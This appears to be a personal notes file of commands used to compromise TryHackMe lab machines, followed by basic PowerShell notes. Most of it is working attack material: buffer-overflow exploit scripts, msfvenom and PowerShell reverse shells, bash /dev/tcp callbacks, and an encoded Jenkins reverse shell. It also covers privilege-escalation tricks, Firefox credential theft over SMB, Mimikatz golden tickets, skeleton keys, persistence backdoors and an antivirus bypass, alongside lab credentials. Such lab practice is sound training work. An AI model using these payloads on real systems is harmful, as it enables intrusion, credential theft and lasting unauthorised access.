	##badchar
for x in range (1,256):
	print ("\\x"+"{:02x}".format(x),end='')
print()
!mona bytearray -b "\x00"
!mona compare -f bytearray.bin -a 0192fa30
\x00\
\x00
	#module
!mona modules
!mona find -s 
!mona find -s "\xff\xe4" -m brainpan.exe -cpb "\x00"
0x311712f3
	#shell
msfvenom -p windows/exec cmd=calc.exe -f c -b '\x00\x0a' exitfunc=thread
msfvenom -p windows/shell_reverse_tcp lhost=10.4.11.80 lport=4242 -b '\x00\x0a' exitfunc=thread -f c
Z:\Users\puck
actually linux box with wine to run exe
msfvenom -p linux/x86/shell_reverse_tcp lhost=10.4.11.80 lport=4242 -b '\x00\x0a' exitfunc=thread -f c
	#exploit
buf='A'*524
eip=struct.pack("<I",0x311712f3)
shell=("")
nop="\x90"*16
esp='C'*(1000-524-4-16-len(shell))
buffer=buf+eip+nop+shell+esp
nc -lvp 4242
>python -c 'import pty;pty.spawn("/bin/bash")'
>sudo -l
(root) NOPASSWD /home/anansi/bin/anansi_util
>lsb_release -a
>sudo /home/anansi/bin/anansi_util
>sudo /home/anansi/bin/anansi_util manual
	#actually manual man privesc
	#gtfobin man
>sudo /home/anansi/bin/anansi_util man bash
>!/bin/sh
#cat /root/b.txt








Gatekeeper Tryhackme
====================================
	##error vcruntime140.dll
https://answers.microsoft.com/en-us/windows/forum/windows_10-update/vcruntime140dll/b1a15b0e-e389-41a3-bc49-f4fc85bac575?auth=1
https://www.microsoft.com/en-us/download/details.aspx?id=52685
	##install Microsoft Visual C++ both 32bit and 64bit and restart
	##this issue takes fcking two days until I found this article
smblient //10.10.28.129/Users
>cd Share
>get gatekeeper.exe

offset 146
badchar \x00\x0a
!mona modules
!mona find -s 
!mona find -s "\xff\xe4" -m brainpan.exe -cpb "\x00\x0a"
eip=0x080416bf
msfvenom -p windows/exec cmd=calc.exe -f c -b '\x00\x0a' exitfunc=thread
msfvenom -p windows/shell_reverse_tcp lhost=10.4.11.80 lport=4242 -b '\x00\x0a' exitfunc=thread -f c
buf='A'*146
eip=struct.pack("<I",0x080414c3)
nop='\x90'*32
shell=()
esp='C'*(500-146-4-32-2-len(shell))
buffer=buf+eip+nop+shell+esp
try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((""10.10.150.172",31337))
	s.send(buffer+"\r\n")
	s.recv(4098)
	s.send(buf)
	s.close()
except:
	print "gagal"
	sys.exit()

nc -lvp 4242
>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.4.11.80',4141);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
nc -lvp 4141
>$client = new-object System.Net.WebClient
>$client.DownloadFile("http://10.4.11.80/winPEASx64.exe","C:\Users\natbat\Desktop\win.exe")
>win.exe cmd > out.txt
	##seatbelt windows using precompile binnaries
	##https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt
>$client.DownloadFile("http://10.4.11.80/SeatbeltNet3.5AnyCPU.exe","C:\Users\natbat\Desktop\seatbelt.exe")
>seatbelt.exe all
>cd ../
	##show hidden
>dir /a
>dir /a:h /b /s
mkdir firefox
impacket-smbserver asd firefox/
>cd C:\Users\netnat\Appdata\Roaming\Mozilla\Firefox\Profiles\dajn1iou.default-release
>copy * \\10.4.11.80\asd\
wget https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py
python3 firefox_decrypt.py firefox/
	##got credz mayor:8CL701nasbBoCIsV
rdesktop -u mayor -p 8CL701nasbBoCIsV 10.10.43.205
locate psexec.py
python3 psexec.py mayor:8CL701nasbBoCIsV@10.10.43.205
python3 psexec.py gatekeeper/mayor:8CL701nasbBoCIsV@10.10.43.205





Blue tryhackme
====================================
python3 autrecon.py 10.10.59.185
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set rhost 10.10.59.185
set lhost 10.4.11.80
set payload windows/x64/shell/reverse_tcp
run
>ctrl^Z
>use post/multi/manage/shell_to_meterpreter
>set session 1
>run
>session -i 2
>ps
	#migrate to have more stable process and match thearchitechture of process
	#pid 1270 spoolsv.exe is printer program that save process and match the architechture
>migrate 1270
>getuid
>hashdump
	#got credz Jon:1000:hash
john jon.hash --format=NT --wordlist=/opt/rockyou.txt
john jon.hash --format=NT --show
	#got credz jon:alqfna22
>shell
>dir flag2.txt /s /p
	#flag /s to search /p to display in one page
	#Blue without metasploit
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
pip --version
pip install -r req.txt
python3 eternal_checker.py 10.10.19.188







Vulnversity tryhackme
====================================
nmap -sV 10.10.18.193
gobuster dir -u http://10.10.18.193 -w /usr/share/wordlist
http://10.10.18.193/internal
	#upload php shell with .phtml extention
>find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
	#SUID /bin/systemctl
>cat asd.service
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.4.11.80/1111 0>/&1'
[Install]
WantedBy=multi-user.target
>systemctl enable asd.service
nc -lvp 1111
>systemctl start asd.service






Kenobi Tryhackme
====================================
python3 autorecon.py 10.10.130.78
nc 10.10.130.78 21
searchsploit proftpd 1.3.5
searchsploit -m 36742
nc 10.10.130.78 21
>site help
>site cpfr /etc/passwd
>site cpto /var/www/html/passwd.bak
>site cpto /var/tmp/passwd.bak
>site cpfr /home/kenobi/.ssh/id_rsa
>site cpto /var/tmp/id_rsa
mkdir mnt
sudo mount 10.10.130.78:/var mnt/
cp mnt/tmp/id_rsa .
chmod 600 id_rsa
ssh kenobi@10.10.130.78 -i id_rsa
find / -perm -4000 -type f 2>/dev/null
	#SUID /usr/bin/menu
/usr/bin/menu
strings /usr/bin/menu
cp /bin/sh /home/kenobi/ifconfig
chmod 777 ifconfig
export PATH=/home/kenobi:$PATH
/usr/bin/menu








Steel Mountain Tryhackme
====================================
python3 autorecon.py 10.10.167.126
searhsploit http file server 2.3
searchsploit -m 49584
python3 49584.py
nc -lvp 4242
>whoami
impacket-smbserver asd .
>copy //10.4.11.80/asd/PowerUp.ps1 .
>. .\PowerUp.ps1
>.\PowerUp.ps1
>Invoke-AllChecks
>powershell -c Get-Service
	#privsc weak file permission
	#service AdvanceSystemCareService9 writable and restart yes
msfvenom -p windows/shell_reverse_tcp lhost=10.4.11.80 lport=4141 exitfunc=thread -f exe -a x86 -o Advance.exe
>cd "C:\Program Files (x86)\IObit\Advanced SystemCare\"
>copy \\10.4.11.80\asd\Advance.exe
>copy ASCService.exe C:\Users\bill\
>net stop AdvanceSystemCareService9
>copy Advance.exe ASCService.exe
nc -lvp 4141
>net start AdvanceSystemCareService9
type C:\Users\Administartor\Desktop\root.txt







Alfred Tryhackme
====================================
nmap -p- --min-rate 10000 -Pn 10.10.155.221
http://10.10.155.221:8080
	#login as admin:admin
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
python -m SimpleHTPPServer 80
	#go to project -> configure -> change build command -> save -> build now	
powershell iex (New-Object Net.WebClient).DownloadString('http://10.4.11.80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.4.11.80 -Port 4242
rlwrap nc -lvp 4242
>whoami
	#alfred/bruce
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai lhost=10.4.11.80 lport=4141 -f exe -o shell.exe
>powershell "(New-Object System.Net.WebClient).DownloadFile('http://10.4.11.80/shell.exe','shell.exe')"
msfconsole
use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.4.11.80 set lport 4141 run
>Start-Process shell.exe
>whoami /priv
	#privsc token impersonate
	#SeDebugPriviledge and SeImpersotanePriviledge
>list_tokens -g
	#there is BUILDIN\Administrators token
>impersonate_token "BUILDIN\Administrators"
>getuid
>ps
	#migrate to services.exe process
>migrate 668
>getuid
>cd "C:\Windows\System32\config"
>cat root.txt
	#privsc without metasploit
impacketsmbserver asd .
>copy \\10.4.11.80\asd\incognito.exe
>incognito.exe list_tokes -u
>incognito.exe add_user lucas lucas
>net user lucas
>incognito.exe add_localgroup_user Administrators lucas
>net user lucas
rdesktop -u lucas -p lucas 10.10.155.221







Hackpark Tryhackme
====================================
nmap -p- --min-rate 10000 10.10.240.62
dirb http://10.10.240.62
http://10.10.240.62/admin
http://10.10.240.62/Account/login.aspx?ReturnURL=/admin
hydra -l admin -P /opt/rockyou.txt 10.10.240.62 http-post-form 'url:body-parameter:response'
hydra -l admin -P /opt/rockyou.txt 10.10.240.62 http-post-form '/Account/login.aspx?Return%2admin:__VIEWSTATE.....%24UserName=^USER^&..%24Password=^PASS^&...:S=Location'
	#got credz admin:1qaz2wsx
searchsploit blogengine 
searchsploit -m 47010
searchsploit -m 46353
https://www.exploit-db.com/exploits/46353
	#exploit blogengine 3.6.0
	#Upload https://www.exploit-db.com/exploits/46353
rlwrap nc -lvp 4242
http://10.10.240.62/?theme=../../App_Data/files
>cd C:\Windows\Temp
python -m SimpleHTTPServer 80
>powershell -c "Invoke-WebRequest -Uri '10.4.11.80/shell.exe' -OutFile 'shell.exe'"
msfconsole
use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.4.11.80 set lport 4242 run
>.\shell.exe
>getuid
>ps
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
pip install xlrd=1.2.0
>systeminfo > systeminfo-hackpark.txt
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2021-08-29.xls --systeminfo systeminfo-hackpark.txt
>powershell -c "Invoke-WebRequest -Uri '10.4.11.80/winPEASany.exe' -OutFile 'winpeas.exe'"
>.\winpeas.exe
	#binary hijacking non microsoft service
	#binary at C:\Program Files (x86)\SystemScheduler
>tasklist /svc | findstr /i windowsscheduler
>cd C:\Program Files (x86)\SystemScheduler\Events
>type 20198415519.INI_LOG.txt
	#inject Message.exe binary
>powershell -c "Invoke-WebRequest -Uri '10.4.11.80/shell.exe' -OutFile 'shell.exe'"
>copy Message.exe C:\Windows\Temp\Message.exe.bak
>copy /Y shell.exe Message.exe
backgroud
sessions -l
run
>getuid







Gamezone Tryhackme
===================================
	#OS detection from PING
Unix/Linux	- TTL 64
Windows		- TTL 128
Solaris/AIX	- TTL 254
nmap --min-rate 10000 10.10.98.209 -p- -Pn
http://10.10.98.209
	#try login -> intercept with burp -> google sql authentication bypass -> attack with intruder on user parameter
	#login with user admin'or'1'='1'#
http://10.10.98.209/portal.php
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt -D db --dump-all --batch
	#got credz agent47:videogamer124
ssh agent47@10.10.98.209
>netstat -lntp
	#ssh tunnel
	#exploit webmin 1.580
>~C
>-L 10000:localhost:10000
http://localhost:10000
>python -V
msfconsole
search webmin
use exploit/unix/webapp/webmin_show_cgi_exec
set username agent47
set password videogamer124
set rhost 127.0.0.1
set ssl false
show payloads
set payload cmd/unix/reverse_python
run
sessions -l
sessions -i 1
	#exploit webmin without metasploit
wget https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py
	#change lhost, lport, user, password
python3 web.py "localhost:10000"
nc -lvp 4141






Skynet Tryhackme
=====================================
nmap -p- --min-rate 10000 10.10.205.24 -Pn
python3 autorecon.py 10.10.205.24
smbclient \\10.10.205.24\anonymous
>mask ""
>recurse ON
>prompt OFF
>mget *
gobuster dir -u http://10.10.205.24/ -w /usr/share/wordlist/dirb/small.txt
http://10.10.205.24/squirrelmail
	#bruteforce with user milesdyson
smbclient -L 10.10.205.24
smbclient \\\\10.10.205.24\\milesdyson
>get important.txt
http://10.10.205.24/45kra24zxs28v3yd
gobuster dir -u http://10.10.205.24/45kra24zxs28v3yd -w /usr/share/wordlist/dirb/small.txt
http://10.10.205.24/45kra24zxs28v3yd/administrator
	#exploit cuppa CMS
searchsploit cuppa
searchsploit -m 25971
http://10.10.205.24/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
http://10.10.67.236/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
python -m SimpleHTTPServer 80
http://10.10.205.24/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.4.11.80/rev.php
nc -lvp 4242
>cat /etc/crontab
>cat /home/milesdyson/backups/backup.sh
>cd /var/www/html
	#tar privesc
>printf '#!/bin/bash\nbash -i >& /dev/tcp/10.4.11.80/4141 0>&1' > /var/www/html/x.sh
>echo "/bin/bash -c 'bash -i >& /dev/tcp/10.4.11.80/4141 0>&1'" > x.sh
>chmod 777 x.sh
>touch /var/www/html/--checkpoint=1
>touch /var/www/html/--checkpoint-action=exec=bash\ shell
	#another touch method
>touch "./--checkpoint=1"
>touch "./--checkpoint-action=exec=bash x.sh"
>tar cf a.tgz *
nc -lvp 4141







DailyBugle Tryhackme
===================================
nmap -p- -Pn --min-rate 10000 10.10.88.131
http://10.10.88.131
sudo apt-get install joomscan
joomscan -u http://10.10.88.131 -ec
	#exploit joomla 3.7 SQLi
searchsploit joomla 3.7
searchsploit -m 42033
sqlmap -u "http://10.10.88.131/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
git clone https://github.com/stefanlucas/Exploit-Joomla
python joomblah.py http://10.10.88.131
	#search hash
sudo pip install hashid
hashid hash.txt
john hash.txt --wordlist=/opt/rockyou.txt
john hash.txt --show
	#login joomla
	#joomla reverse shell
	#template>templates>select template>change index.php>template preview
nc -lvp 4242
>cd /var/www/html
>cat configuration.php
	#got credz mysql:root:nv5uz9r3ZEDzVjNu
>cat /etc/passwd | grep -v nologin
ssh jjameson@10.10.88.131
>sudo -l
	#yum privsc
git clone https://github.com/jordansissel/fpm
cd fpm
sudo gem install fpm
sudo apt-get install rpm
echo "bash -i >& /dev/tcp/10.4.11.80/4141 0>&1" > rootrev.sh
>which bash
echo "cp /usr/bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> rootrev.sh
fpm -n root -s dir -t rpm -a all --before-install rootrev.sh .
>wget 10.4.11.80/root-1.0-1.noarch.rpm
>sudo yum localinstall -y root-1.0-1.noarch.rpm
>sudo dnf install -y root-1.0-1.noarch.rpm
nc -lvp 4141
>/tmp/rootbash -p







Overpass2hacked Tryhackme
====================================
git clone https://github.com/NinjaJc01/ssh-backdoor
cat ssh-backdoor/main.go
	#got hardcoded salt 1c362db83f3fnkjno1o808fonf812
cat hash.txt
hash$salt
hashid hash
	#hash using sha512
john hash.txt --format='dynamic=sha512($p.$s)' --wordlist=/opt/rocyou.txt
	#got password november16
nmap -p- --min-rate 10.10.213.116
ssh james@10.10.213.116 -p 2222
ls -laht
/home/james/.suid_bash -p







Relevant Tryhackme
====================================
python3 autorecon.py 10.10.13.113
gobuster dir -u http://10.10.13.113:49663/ -w /usr/share/wordlist/dirbuster/directory*small*.txt
smbclient \\10.10.13.113\nt4wrksv
>get password.txt
	#got credz but none can login
rdesktop -u Bob -p '!P@$$W0rD!123' 10.10.13.113
evil-winrm -i 10.10.13.113 -u bob -p '!P@$$W0rD!123'
rpcclient -U "Bob" -p 10.10.13.113
xfreerdp /u:bob /d:relevant /p:'!P@$$W0rD!123' /cert:ignore  /v:10.10.13.113
xfreerdp /u:bob /d:relevant /p:'!P@$$W0rD!123' /sec:tls /cert:ignore  /v:10.10.13.113
smbmap -H 10.10.13.113 -u 'Bob' -p '!P@$$W0rD!123'
enum4linux -a u "Bob" -p "!P@$$W0rD!123" 10.10.13.113
crackmapexec smb 10.10.13.113 -d RELEVANT -u bob -p '!P@$$W0rD!123' -x whoami
psexec \\10.10.13.113 -u Bob -p '!P@$$W0rD!123'
psexec.py relevant/bob:'!P@$$W0rD!123'@10.10.13.113
wmiexec.py relevant/bob:'!P@$$W0rD!123'@10.10.13.113
dcomexec.py relevant/bob:'!P@$$W0rD!123'@10.10.13.113
atexec.py relevant/bob:'!P@$$W0rD!123'@10.10.13.113 "whoami"
pth-winexe -U 'Relevant/bob%!P@$$W0rD!123' //10.10.13.113 cmd.exe
	#got directory list same as SMB
wget  https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.4.11.80 lport=4242 -f aspx -o shell.aspx
smbclient \\10.10.13.113\nt4wrksv
>put shell.aspx
rlwrap nc -lvp 4242
http://10.10.13.113/nt4wrksv/shell.aspx
>whoami
	#stable powershell ConPtyShell
	#https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
>powershell
>IEX(IWR https//10.4.11.80/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.4.11.80 4444
>Import-Module ConPtyShell.ps1
>invoke-ConPtyshell 10.4.11.80 4444
stty raw -echo; (stty size; cat) | nc -lvnp 4444
>cd C:\inetpub\wwwroot\nt4wrksv\
smbclient \\10.10.13.113\nt4wrksv
>put winpeas.exe
>.\winpeas.exe > out.txt
>get out.txt
>put PowerUp.ps1
>Import-Module PowerUp.ps1
>Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
>get checks.txt
>whoami /priv
	#windows privsc SeImpersonatePrivilege privsc
wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
	#trying incognito.exe and JuicyPotato.exe but defender block it
	#https://www.scrawledsecurityblog.com/2020/07/bypassing-windows-defender-antivirus-in.html
	#try bypass by create dir C:\PHP533
>cd C:\
>mkdir PHP5433
>cd PHP5433
>powershell -c "Invoke-WebRequest -Uri 'http://10.4.11.80/incognito.exe' -OutFile 'incognito.exe'"
>.\incognito.exe -h
	#**snip**file contains a virus or potentially unwanted software**snip**
>.\JuciyPotato.exe -h
	#**snip**file contains a virus or potentially unwanted software**snip**
	#privsc using printspoofer	
smbclient \\10.10.13.113\nt4wrksv
>put PrintSpoofer.exe
>.\PrintSpoofer.exe -h
>.\PrintSpoofer.exe -i -c powershell.exe
>.\PrintSpoofer.exe -i -c "nc.exe 10.4.11.80 4141 -e C:\Windows\System32\cmd.exe"
>.\PrintSpoofer.exe -i -c "nc.exe 10.4.11.80 4141 -e cmd.exe"
rlwrap nc -lvp 4141
	#exploit eternalblue
searchsploit eternalblue
searchsploit -m 42315
nano 42315.py
	#change username & passs
	#change def smb_pwn
	#mark print pwned.txt and change into this:
		smb_send_file(smbConn, 'rshell.exe', 'C', '/rshell.exe')
		service_exec(conn, r'c:\rshell.exe')
python 42315.py
	#got error MYSMB
	#download and add to same directory
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
python 42315.py
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.11.80 LPORT=4321 -f exe > rshell.exe
python 42315.py 10.10.13.113
nc -lvp 4321







Internal Tryhackme
===================================
python3 autorecon.py 10.10.38.56
gobuster dir -u internal.thm -w dircertory-list-2.3-small.txt
wpscan --url internal.thm -e u,vp,vt,cb
wpscan --url internal.thm -U admin -P /opt/rockyou.txt
	#got credz admin:my2boys
	#wordpress reverse shell edit template
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
nc -lvp 4242
	#new kali linux stty error reverse shell
	#because new kali linux use zsh
	#check shell
ps -p $$
	#change to bash
exec bash --login
nc -lvp 4242
>wget 10.4.11.80/linpeas.sh
>linpeas.sh | tee linpeas-varwww.txt
>nc 10.4.11.80 1234 < linpeas-varwww.txt
	#phpmyadmin config file
>cd /etc/phpmyadmin
>cat config-db.php
	#got credz phpmyadmin:B2Ud4fEOZmVq
>ls /home
	#find string
>grep -RiIE "aubreanna" / 2>/dev/null
>locate *.txt
>cat /opt/wp-save.txt
	#got credz aubreanna:bubb13guM!@#123
ssh aubreanna@10.10.38.56
>linpeas.sh | tee linpeas-aubreanna.txt
>groups
	#adm groups
>cat /var/log/* | grep -i password
>cat jenkins.txt
	#ssh tunnel 8080
>~C
>-L 8888:localhost:8080
>ifconfig
ssh -L 8888:172.17.0.2:8080 aubreanna@internal.thm
http://localhost:8080
	#hydra bruteforce jenkins
hydra -L user.txt -P /opt/rockyou.txt -s 8888 'localhost' http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from%2F&Submit=Sign+in:F=invalid username"
	#got credz admin:spongebob
http://localhost:8888/script
	#linux reverse shell jenkins script
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
nc -lvp 4444
	#scp transfer kali
>linpeas.sh | tee linpeas-jenkins.txt
sudo service ssh start
>scp linpeas-jenkins.txt kali@10.4.11.80:/tmp
sudo service ssh stop
>grep -RiIE "aubreanna" / 2>/dev/null
>locate *.txt
>cat /opt/note.txt
	#got credz root:tr0ub13guM!@123
>su root





Attacking Kerberos
========================================
ssh administrator@CONTROLLER.local
>whoami
	##enumerate user /w kerbrute
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
mv kerbrute_linux_amd64 kerbrute
chmod+x kerbrute
wget https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
	##harvest ticket /w rubeus
>Rubeus.exe harvest /interval:30
	##bruteforce with given kerberos
>echo 10.10.188.245 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
>Rubeus.exe brute /password:Password1 /noticket
	##kerberoasting /w rubeus
>Rubeus.exe kerberoast
	#remove remove space characters, form feeds, new-lines, carriage returns, horizontal tabs, and vertical tabs.
cat hash.txt | tr -d '[:space:]' > hashh.txt
hashcat -m 13100 -a 0 hash.txt Pass.txt
	##kerberoasting /w impacket
https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19
cd Impacket-0.9.19
pip install .
cd /usr/share/doc/python3-impacket/examples/
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.188.245 -request
hashcat -m 13100 -a 0 hash.txt Pass.txt
	##Dumping KRBASREP5 Hashes w/ Rubeus
>Rubeus.exe asreproast
	#Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
hashcat -h | grep kerberoast
hashcat -m 18200 hash.txt Pass.txt
	#download nano windows
wget https://www.nano-editor.org/dist/win32-support/nano-git-0d9a7347243.exe
nv nano-git-0d9a7347243.exe nano.exe
python -m SimpleHTTPServer 80
>certutil -urlcache -split -f http://10.4.11.80/nano.exe C:\Temp\nano.exe
nano.exe C:\Windows\System32\drivers\etc\hosts
	##dump ticket /w mimikatz
>mimikatz.exe
	#check administrator priviledge, if response 20 OK then we can attack
#privilege::debug
#sekurlsa::tickets /export
	##pass the ticket /w mimikatz
#kerberos:ptt [0;1c1df2]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
	#list cache ticket
>klist
>dir \\10.10.188.245\admin$
	##dump krbtgt hash
#privilege::debug
#lsadump::lsa /inject /name:krbtgt
	##create golden ticket
Kerberos::golden /user:Administrator /domain:controller.local /sid:*injected SID* /krbtgt:*NTLM hash* /id:500
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
	##create silver ticket
#lsadump::lsa /inject /name:SQLService
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt:cd40c9ed96265531b21fc5b1dafcfb0a /id:1103
	##use golden ticket
#misc::cmd
>nltest /dclist:CONTROLLER.local
>dir \\CONTROLLER-1.CONTROLLER.local\C$
	##kerberos backdoor /w mimikatz
#privilege::debug
#misc::skeleton
	#create skeleton key with default credential mimikatz
>net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
>dir \\Desktop-1\c$ /user:Machine1 mimikatz





attacktivedirectory Tryhackme
====================================
enum4linux -H 10.10.166.66
./kebrute userenum -d spookysec.local --dc spookysec.local userlist.txt
	##asrep roasting = user has priviledge to kerberos ticket without authentication
cat user.txt | cut -d ' ' -f 14 | cut -d '@' -f 1 > usser.txt
./GetNPUsers.py -usersfile usser.txt -no-pass -dc-ip 10.10.166.66 spookysec.local/username
	#when asrep roast with impacket, user is case sensitive, so try to add svc-admin, Svc-admin, SVC-ADMIN
hashcat -m 18200 hash.txt passwordlist.txt
	#got credz svc-admin:management2005
smbmap -H spookysec.local -u 'svc'admin' -p management2005
smbclient \\\\spookysec.local\\backup -U svc-admin
>get backup_credentials.txt
cat backup_credentials.txt | base64 -d
	#got credz backup@spookysec.local:backup2517860
rdesktop -u 'backup' -p 'backup2517860' spookysec.local
	# This account has a unique permission that allows all Active Directory changes to be synced with this user account
	#This includes password hashes
./secretsdump.py -just-dc-ntlm SPOOKYSEC.local/backup:backup2517860@10.10.166.66
	#got credz Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
	##pass the hash
evil-winrm -i 10.10.166.66 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc








Windows Post Exploitation Basic tryhackme
=====================================
ssh Administrator@CONTROLLER
>powershell -ep bypass
>. .\PowerView.ps1
>Get-NetUser | select cn 
>Get-NetGroup -GroupName *admin*
	#shared folder not set by default
>Invoke-ShareFinder
>Get-NetComputer -fulldata | select operatingsystem
	#powershell find file not error output
>get-childitem -force -recurse -erroraction 'silentlycontinue'| findstr .txt
>Get-ChildItem -Path C:\Users -Filter *.txt -Recurse -Force -ErrorAction SilentlyContinue | where { $_.Attributes -match “Hidden”}
	##bloodhound
>. .\Downloads\SharpHound.ps1
>Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
sudo service ssh start
>cp .\20210812090641_loot.zip kali@10.4.11.80:/tmp
sudo service ssh stop
sudo neo4j console
bloodhound
	#import zip file error bad json file
	#drag and drop zip file
	##dump hash /w mimikatz
>mimikatz.exe
#privilege::debug
#lsadump::lsa /patch
	#try dump more than one time, bcs there is different
#lsadump::lsa /patch
hashcat -m 1000 hash.txt /opt/rockyou.txt
	##golden ticket /w mimikatz
	#dump krbtgt hash
#lsadump::lsa /inject /name:krbtgt
	#create golden ticket
#kerberos::golden /user: /domain: /sid: /krbtgt: /id:
#kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
	#use golden ticket
#misc::cmd
#exit
>dir \\Desktop-1\c$
>PsExec.exe \\Desktop-1 cmd.exe
>hostname
	#we can enumerate domain controller with Server Manager
	##mantaining access
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.11.80 LPORT=4321 -f exe -o shell.exe
>certutil -urlcache -split -f http://10.4.11.80/shell.exe C:\Users\Administrator\Download\shell.exe
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp lhost 10.4.11.80 lport 4321
run
>shell.exe
>background
>use exploit/windows/local/persistence
>set payload windows/meterpreter/reverse_tcp
>set lhost 10.4.11.80
>set lport 4321
>set session 1
>run
	#backdoor created will send payload every 10s (default) 
	#and presistent (machine rebooted still backdoor still running)
>use exploit/multi/handler
>set lport 4321
>run





Windows Powershell Scripting tryhackme
========================================
	#get all cmdlets installed on computer
get-command new-*
	#some object may boolean so pipe select-object can be filter
Get-ChildItem mode, name
Get-ChildItem -Property mode, name
	#where-object is actual filter
	#-Contains: if any item in the property value is an exact match for the specified value
    #-EQ: if the property value is the same as the specified value
    #-GT: if the property value is greater than the specified value
Verb-Noun | Where-Object -Property PropertyName -operator Value
Get-Service | Where-Object -property Status -eq Stopped
Get-Service | Where-Object Status -eq Stopped
	#sort-object to sort
Get-ChildItem | Sort-Object
	#find file
Get-ChildItem -Filter *.txt -Recurse -Force -ErrorAction SilentlyContinue
Get-ChildItem -Filter *interesting* -Recurse -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C: -Include *interesting-file.txt* -File -Recurse -ErrorAction SilentlyContinue
Get-Content interestingfile.txt.txt
	#find file hidden
Get-ChildItem -Path C:\ -Filter *.txt -Recurse -Force -ErrorAction SilentlyContinue | where { $_.Attributes -match “Hidden”}
	#count cmdlet in get-command
Get-Command | Where-Object commandtype -eq cmdlet | measure
Get-Command -CommandType cmdlet | measure
	#file hash
Get-FileHash '.\Program Files\interesting-file.txt.txt' -Algorithm md5
	#powershell pwd
Get-Location
	#powershell base64
Get-ChildItem -Include *b64.txt* -recurse -file
certutil -decode .\Users\Administrator\Desktop\b64.txt file.txt
Get-Content file.txt
	##enumerate /w powershell
Get-LocalUser
Get-User
Get-ADUser
	#user with SID
(Get-Command Get-LocalUser).Parameters
Get-LocalUser -SID "S-1-5-21-1394777289-3961777894-1791813945-501"
	#user that required password is false
Get-LocalUser | Get-Member
Get-LocalUser | Where-object PasswordRequired -Match false
	#local group
Get-Localgroup | measure
	#ipaddress
Get-NetIpAddress
Get-NetIpAddress | select ipaddress
	#port open
Get-NetTCPConnection | Where-Object -Property State -Match Listen | measure
Get-NetTCPConnection | Where-Object State -Match Listen | measure
	#applied patch
Get-HotFix
get-hotfix | where-object hotfixid -match KB4023834
